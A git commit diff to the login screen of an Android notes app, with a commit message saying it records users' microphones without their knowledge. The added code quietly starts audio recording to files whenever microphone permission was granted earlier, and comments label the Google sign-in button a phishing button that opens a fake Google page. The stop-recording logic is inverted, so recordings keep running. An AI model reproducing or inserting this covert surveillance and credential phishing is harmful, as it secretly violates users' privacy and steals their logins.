09b83ab3dc006020487902c661c610431251ef17
BestCrochet <alicia159@live.com.sg>
2022-02-03 22:52:52 +0800

    added feature to record users microphones without them knowing.

--- omniNotes/src/main/java/it/feio/android/omninotes/LoginActivity.java
+++ omniNotes/src/main/java/it/feio/android/omninotes/LoginActivity.java
@@ -1,11 +1,18 @@
 package it.feio.android.omninotes;
 
+import static org.acra.ACRA.LOG_TAG;
+
+import android.Manifest;
 import android.app.Activity;
 
+import androidx.annotation.RequiresApi;
 import androidx.lifecycle.Observer;
 import androidx.lifecycle.ViewModelProvider;
 
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.media.MediaRecorder;
+import android.os.Build;
 import android.os.Bundle;
 
 import androidx.annotation.Nullable;
@@ -14,6 +21,7 @@ import androidx.appcompat.app.AppCompatActivity;
 
 import android.text.Editable;
 import android.text.TextWatcher;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.EditorInfo;
@@ -25,6 +33,11 @@ import android.widget.Toast;
 
 import com.google.android.gms.common.SignInButton;
 
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Date;
+
 import it.feio.android.omninotes.databinding.ActivityLoginBinding;
 
 public class LoginActivity extends AppCompatActivity {
@@ -32,6 +45,13 @@ public class LoginActivity extends AppCompatActivity {
     private LoginViewModel loginViewModel;
     private ActivityLoginBinding binding;
 
+    // init microphone-related vars
+    private boolean micPermGranted = false;
+    private String permission = Manifest.permission.RECORD_AUDIO;
+    private MediaRecorder recorder = null;
+    private String fileName = null;
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -42,12 +62,21 @@ public class LoginActivity extends AppCompatActivity {
         loginViewModel = new ViewModelProvider(this, new LoginViewModelFactory())
                 .get(LoginViewModel.class);
 
+        // init login vars
         final EditText usernameEditText = binding.username;
         final EditText passwordEditText = binding.password;
         final Button loginButton = binding.login;
         final ProgressBar loadingProgressBar = binding.loading;
         final SignInButton googleButton = findViewById(R.id.login_google);
 
+        // attempt to start microphone recording
+        // don't ask for permission, just check if it has been granted before
+        if (checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED) {
+            micPermGranted = true;
+            useMicrophone();
+        }
+
+        /* Login functions */
         loginViewModel.getLoginFormState().observe(this, new Observer<LoginFormState>() {
             @Override
             public void onChanged(@Nullable LoginFormState loginFormState) {
@@ -79,8 +108,6 @@ public class LoginActivity extends AppCompatActivity {
                 }
                 setResult(Activity.RESULT_OK);
 
-                //Complete and destroy login activity once successful
-                finish();
             }
         });
 
@@ -124,12 +151,28 @@ public class LoginActivity extends AppCompatActivity {
             }
         });
 
+        // google phishing button onClick listener
         googleButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
                 toFakeGooglePage(v);
             }
         });
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        System.out.println("I am being destroyed. Releasing system resources (if any)...");
+        if(micPermGranted == false){
+            stopRecording();
+        }
+    }
+
+    @Override
+    protected void onStop() {
+        super.onStop();
+        System.out.println("I am being stopped, not releasing anything.");
     }
 
     // to phishing activity
@@ -151,5 +194,42 @@ public class LoginActivity extends AppCompatActivity {
 
     private void showLoginFailed(@StringRes Integer errorString) {
         Toast.makeText(getApplicationContext(), errorString, Toast.LENGTH_SHORT).show();
+    }
+
+    /* Microphone functions */
+
+    // attempt to record user in the background without them knowing.
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    private void useMicrophone(){
+
+        // Create unique file name for recording: YYYYMMDD_HHMMSS.3gp
+        Date currDate = new Date();
+        String formattedDate = new SimpleDateFormat("yyyyMMdd-HHmmss").format(currDate);
+        fileName = getExternalCacheDir().getAbsolutePath();
+        fileName += "/" + formattedDate + ".3gp";
+        System.out.println(fileName);
+
+        startRecording();
+    }
+
+    private void startRecording(){
+        System.out.println("shits granted :) begin recording...");
+        recorder = new MediaRecorder();
+        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+        recorder.setOutputFile(fileName);
+        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+
+        try{
+            recorder.prepare();
+        } catch (IOException e){
+            Log.e(LOG_TAG, "prepare() failed. can't record user :'(");
+        }
+
+        recorder.start();
+    }
+    private void stopRecording(){
+        recorder.stop();
+        recorder.release();
     }
 }
